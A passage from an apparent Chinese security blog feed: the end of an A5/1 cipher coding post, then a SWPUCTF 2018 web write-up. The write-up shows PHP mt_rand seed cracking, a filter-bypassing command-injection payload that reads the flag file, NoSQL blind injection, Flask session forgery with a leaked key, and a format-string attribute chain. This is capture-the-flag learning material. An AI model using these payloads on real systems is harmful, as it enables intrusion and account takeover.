class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">    str_cipher = bin2str(bin_cipher)</span><br><span class="line">    print(<span class="string">"解密后的结果:"</span>+str_cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span><span class="params">()</span>:</span></span><br><span class="line">    choice = input(<span class="string">"1.加密\n2.解密\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">'1'</span>:</span><br><span class="line">        message = input(<span class="string">"输入你的信息\n"</span>)</span><br><span class="line">        a5_encode(message)</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">'2'</span>:</span><br><span class="line">        bin_message = input(<span class="string">"输入你的信息\n"</span>)</span><br><span class="line">        a5_decode(bin_message)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"请重新输入"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        get_info()</span><br></pre></td></tr></table></figure><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>其实这个算法的关键点还是落在了秘钥的长度，体现在其寄存器的长度上，太短了，所以现在已知明文攻击法对这个算法的攻击是先确定其中两个寄存器的初始值再计算出另外一个，所以要想改进就是采用更长的线性反馈寄存器了。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近要做密码学课程设计，每做一个密码就当复习一下，把算法原理啥的都过一遍
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>swpuctf赛后复现</title>
    <link href="0verwatch.top/swpuctf-2018.html"/>
    <id>0verwatch.top/swpuctf-2018.html</id>
    <published>2018-12-22T08:02:40.000Z</published>
    <updated>2018-12-22T12:40:07.803Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛Web真的很有质量，学到了很多东西<a id="more"></a>，值得纪录一下</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码  买个 X ?"></a>用优惠码  买个 X ?</h3><p>上来本能先注册登录一波查看有什么功能，发现注册赠送的优惠码不起任何作用，需要的是24位的注册码(但是给我的只有15位)，而且存在一个exec.php，但是必须要使用过优惠码才可以打开，思路很明确应该是要到这个页面去，但得绕进去，查看是否有常规的信息提示，发现没有提示只好扫一波目录，发现有源码</p><p><img src="https://s1.ax1x.com/2018/12/21/FsZBGt.png" alt="FsZBGt.png"></p><p>查看一下源码发现了产生随机优惠码的的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//生成优惠码</span></span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">'Auth'</span>, $auth);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>证明了为什么这里的优惠码只有15位了，因为他后台就已经限定了长度为15，然后通过现在已经存在的代码反推，根据这篇文章模仿一下，构造出一部分的随机数:<a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $str = <span class="string">"ZQ7hMEpfLtonAzK"</span>;</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">          &#123;</span><br><span class="line">              $pos = strpos($str_rand,$str[$i]);</span><br><span class="line">              <span class="keyword">echo</span> $pos.<span class="string">" "</span>.$pos.<span class="string">" "</span>.<span class="string">"0 "</span>.(strlen($str_rand)<span class="number">-1</span>).<span class="string">" "</span>; </span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">//整理成方便 php_mt_seed 测试的格式</span></span><br><span class="line">  <span class="comment">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>记得这里一定要以PHP 7.2跑，不然跑出来不一样的。。。。这里推出一部分，但是不影响</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">51 51 0 61 45 45 0 61 3 3 0 61 11 11 0 61 21 21 0 61 29 29 0 61 13 13 0 61 22 22 0 61</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/12/21/FsuotJ.png" alt="FsuotJ.png"></p><p>很快就可以跑出来，然后再手动播种，并且更改长度为24，输出秘钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//生成优惠码</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">    mt_srand(<span class="number">323099333</span>);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">24</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $auth;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">youhuima();</span><br></pre></td></tr></table></figure><p>然后就是绕过命令执行的部分了，源代码也有给出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//support</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//执行命令</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 你的输入不正确!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先是限制了只能ip地址，但是使用了m修饰符后就不一样了，可以用<code>%0a</code>去绕过，原因是在<code>^</code>以及<code>$</code>之间会匹配换行之前和之后，只要是一个正确就会返回正确啦，第二轮的过滤，把<code>*</code>，<code>?</code>,<code>flag</code>给你过滤了，绕过我们可以使用<code>\</code>去绕过，官方题解用的单引号去绕过，都一样。。最后发包即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0ac\at /f\lag</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/12/21/FsKX2n.png" alt="FsKX2n.png"></p><h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h3><p>这个题目考的点是注入，又学到了23333，先是查看源代码发现先存在info.php，进去看看发现phpinfo的页面</p><p><img src="https://s1.ax1x.com/2018/12/21/Fsdk79.png" alt="Fsdk79.png"></p><p><a href="https://imgchr.com/i/FsdEkR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/21/FsdEkR.md.png" alt="FsdEkR.md.png"></a></p><p>phpinfo页面表明了开了mongo扩展，可以尝试一下NoSQL注入，这里官方给的wp好像是有一个可以带验证码识别的python脚本，有空得学学那个模块才行</p><p><img src="https://s1.ax1x.com/2018/12/21/FsdrAs.png" alt="FsdrAs.png"></p><p>如果不正确的话显示的是上方的样子，正确的话会显示下方的样子，可以根据此来盲注</p><p><img src="https://s1.ax1x.com/2018/12/21/FsdIE9.png" alt="FsdIE9.png"></p><p>最后注入的密码是skmun，用户是admin，登录就可以获得flag</p><h3 id="皇家线上赌场"><a href="#皇家线上赌场" class="headerlink" title="皇家线上赌场"></a>皇家线上赌场</h3><p>右键可以发现存在source目录，可以在里面找到下面的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost]# tree web</span><br><span class="line">web/</span><br><span class="line">├── app</span><br><span class="line">│   ├── forms.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── models.py</span><br><span class="line">│   ├── static</span><br><span class="line">│   ├── templates</span><br><span class="line">│   ├── utils.py</span><br><span class="line">│   └── views.py</span><br><span class="line">├── req.txt</span><br><span class="line">├── run.py</span><br><span class="line">├── server.log</span><br><span class="line">├── start.sh</span><br><span class="line">└── uwsgi.ini</span><br><span class="line">[root@localhost]# cat views.py.bak</span><br><span class="line">filename = request.args.get(&apos;file&apos;, &apos;test.js&apos;)</span><br><span class="line">if filename.find(&apos;..&apos;) != -1:</span><br><span class="line">    return abort(403)</span><br><span class="line">filename = os.path.join(&apos;app/static&apos;, filename)</span><br></pre></td></tr></table></figure><p>然后可以利用这个点去读文件，但是里面不可以包含<code>..</code>也就是不能使用相对路径，只能使用绝对路径，可以读取文件</p><p><a href="https://imgchr.com/i/Fs0Mod" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/21/Fs0Mod.md.png" alt="Fs0Mod.md.png"></a></p><p>然后尝试读取<code>/proc/self/mounts</code>发现里面存在一个web目录，另外我们知道<code>/proc/[pid]/cwd</code>是进程当前工作目录的符号链接,可以从中读取文件内容，读取到了两个文件内容</p><p><strong>init</strong>.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> register_views</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">()</span>:</span></span><br><span class="line">    app = Flask(__name__, static_folder=<span class="string">''</span>)</span><br><span class="line">    app.secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line">    app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:////tmp/test.db'</span></span><br><span class="line">    register_views(app)</span><br><span class="line">    db.init_app(app)</span><br><span class="line">    <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure><p>view.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_views</span><span class="params">(app)</span>:</span></span><br><span class="line"><span class="meta">    @app.before_request</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_account</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.path == <span class="string">'/signup'</span> <span class="keyword">or</span> request.path == <span class="string">'/login'</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        uname = username=session.get(<span class="string">'username'</span>)</span><br><span class="line">        u = User.query.filter_by(username=uname).first()</span><br><span class="line">        <span class="keyword">if</span> u:</span><br><span class="line">            g.u = u</span><br><span class="line">            g.flag = <span class="string">'swpuctf&#123;xxxxxxxxxxxxxx&#125;'</span></span><br><span class="line">            <span class="keyword">if</span> uname == <span class="string">'admin'</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            now = int(time())</span><br><span class="line">            <span class="keyword">if</span> (now - u.ts &gt;= <span class="number">600</span>):</span><br><span class="line">                u.balance = <span class="number">10000</span></span><br><span class="line">                u.count = <span class="number">0</span></span><br><span class="line">                u.ts = now</span><br><span class="line">                u.save()</span><br><span class="line">                session[<span class="string">'balance'</span>] = <span class="number">10000</span></span><br><span class="line">                session[<span class="string">'count'</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">    @login_required</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">        u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">        field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">        mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">        jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">        <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure><p>现在拥有了secret_key不难想到可以伪造session，但我们需要注意的是<code>u.balance</code>的值需要比1000000大，开始伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span><span class="params">(object)</span>:</span></span><br><span class="line">secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line"></span><br><span class="line">s = SecureCookieSessionInterface().get_signing_serializer(App())</span><br><span class="line">u = s.loads(<span class="string">'.eJwVzDEOgzAQRNG7TE0xBiMWXyZar5cmwUgG0kS5O_CrV_0fsn60miMF3nWw7awH0qO9La9je3tFwhSFzOImZrFQfJpFGVnGuISQy6zUgSLocO7eqq73Evx6C_2A_wVSDx5s.XBzbDQ.TMK2zvIwmNUWxVCXYaJJU7aQzqo'</span>)</span><br><span class="line">u[<span class="string">'username'</span>] = <span class="string">'admin'</span></span><br><span class="line">u[<span class="string">'balance'</span>] = <span class="number">1000000000.0</span></span><br><span class="line">print(s.dumps(u))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw1zDsKw0AMRdG9vNqEN2SC5dlM0GhkCI5l8KcK2budIrc61f2g6lvDHCXx340dbDliR_lpW8fnvkweKOizkFXcxCw3iveDKDPbI48p1TYo9U4RdDg2X0Pn6wxt8yvwPQGtyx-w.XBzkcA.sDFRMVhq2AkzcCAeoHSjBM-_OSA</span><br></pre></td></tr></table></figure><p>接下来就是python格式化字符串的漏洞了，构造继承链，又学到了</p><p><img src="https://s1.ax1x.com/2018/12/21/FsyP8s.png" alt="FsyP8s.png"></p><p>最后的攻击链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/12/21/FsyWGj.png" alt="FsyWGj.png"></p><h3 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h3><p>拿到题目就发现url有些问题，猜测应该可以文件读取，可以查看file.php以及class.php</p><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123;</span><br><span class="line">    $show-&gt;source = $file;</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    